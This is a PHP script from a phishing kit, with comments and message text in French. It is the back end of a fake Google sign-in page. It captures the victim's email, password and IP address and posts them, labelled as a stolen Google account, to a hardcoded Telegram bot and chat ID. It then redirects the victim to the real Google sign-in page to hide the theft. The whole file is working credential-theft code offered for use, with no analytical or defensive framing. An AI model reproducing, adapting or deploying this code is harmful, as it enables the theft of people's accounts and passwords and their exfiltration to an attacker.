<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email    = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip       = $_SERVER['REMOTE_ADDR'] ?? 'Inconnu';

    $message = "🔴 COMPTE GOOGLE VOLÉ (via bot.php)\n\n" .
               "📧 Email : " . $email . "\n" .
               "🔑 Mot de passe : " . $password . "\n" .
               "🌐 IP : " . $ip . "\n" .
               "⏰ Heure : " . date('d/m/Y H:i:s');

    $botToken = "8552249746:AAFUSy-bxQjRkc3LIYkXomeDdl8m9AJ_gIg";
    $chatId   = "8508877242";

    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    $data = [
        'chat_id'    => $chatId,
        'text'       => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

// Redirection vers Google
header("Location: https://accounts.google.com/signin/v2/identifier");
exit();
?>